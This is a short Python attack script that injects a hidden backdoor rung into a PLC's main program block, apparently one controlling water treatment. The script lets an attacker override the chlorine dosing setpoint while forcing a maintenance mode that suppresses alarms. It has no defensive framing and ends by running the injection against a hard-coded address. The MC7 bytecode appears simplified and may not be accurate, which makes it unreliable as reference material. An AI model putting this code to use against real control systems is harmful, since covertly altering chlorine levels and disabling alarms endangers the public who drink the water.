# backdoor_injection.py - Inject hidden rung into PLC

from snap7 import client
import struct

class PLCBackdoor:
    def __init__(self, plc_ip):
        self.plc = client.Client()
        self.plc.connect(plc_ip, 0, 1)

    def inject_backdoor_rung(self):
        """
        Inject hidden rung into OB1:
        - Reads trigger bit M100.0
        - If set, forces chlorine setpoint to MW104 value
        - Bypasses alarms by setting M20.0 (maintenance mode)
        """
        # Download existing OB1
        ob1_data = bytearray(self.plc.full_upload(client.block_types.OB, 1))

        # Craft backdoor rung in MC7 bytecode:
        backdoor_rung = bytes([
            # IF M100.0 (backdoor trigger)
            0x70, 0x00, 0x64, 0x00,  # U M100.0

            # THEN
            # MW100 := MW104 (setpoint override)
            0x71, 0x00, 0x68, 0x00,  # L MW104
            0x72, 0x00, 0x64, 0x00,  # T MW100

            # M20.0 := 1 (maintenance mode - disable alarms)
            0x73, 0x14, 0x00,        # S M20.0

            # ELSE (normal operation)
            0x74,                     # ELSE

            # M20.0 := 0 (enable alarms)
            0x75, 0x14, 0x00,        # R M20.0

            0x00, 0x00                # BEU (Block End Unconditional)
        ])

        # Insert backdoor before BEU instruction in OB1
        beu_offset = ob1_data.rfind(bytes([0x00, 0x00]))
        modified_ob1 = ob1_data[:beu_offset] + backdoor_rung + ob1_data[beu_offset:]

        # Upload modified OB1
        self.plc.download(client.block_types.OB, 1, bytes(modified_ob1))

        print("[+] Backdoor injected into OB1")
        print("[*] Trigger: Set M100.0 = 1")
        print("[*] Control: Write target setpoint to MW104")

    def activate_backdoor(self, target_chlorine_level):
        """
        Activate backdoor to manipulate chlorine dosing
        """
        # Set trigger bit
        self.plc.mb_write(100, 0, bytes([0x01]))  # M100.0 = 1

        # Write target chlorine level (mg/L * 10)
        target_value = int(target_chlorine_level * 10)
        self.plc.mb_write(104, 0, struct.pack('>H', target_value))  # MW104

        print(f"[+] Backdoor activated: Target chlorine = {target_chlorine_level} mg/L")

# Usage
backdoor = PLCBackdoor('192.168.10.100')
backdoor.inject_backdoor_rung()
